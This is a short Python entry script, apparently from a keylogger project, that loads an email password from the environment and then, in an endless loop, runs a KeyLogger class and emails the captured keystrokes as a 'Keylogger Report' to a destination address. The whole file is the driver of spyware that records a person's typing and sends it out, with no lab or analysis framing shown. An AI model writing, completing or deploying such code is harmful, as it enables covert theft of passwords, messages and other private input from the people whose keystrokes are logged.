from os import getenv
from dotenv import load_dotenv

from catcher.log import KeyLogger
from mail.sender import EmailSender

def main() -> None:
    load_dotenv()
    mailFrom = 'Origin Mail'
    password = getenv("PASSWORD")
    mailTo = 'Destination Mail'
    subject = 'Keylogger Report'
    
    while True:
        body = KeyLogger()
        body.start()

        emailSender = EmailSender(mailFrom, password, mailTo, subject, body.string)
        emailSender.sendEmail()

if __name__ == '__main__':
    main()


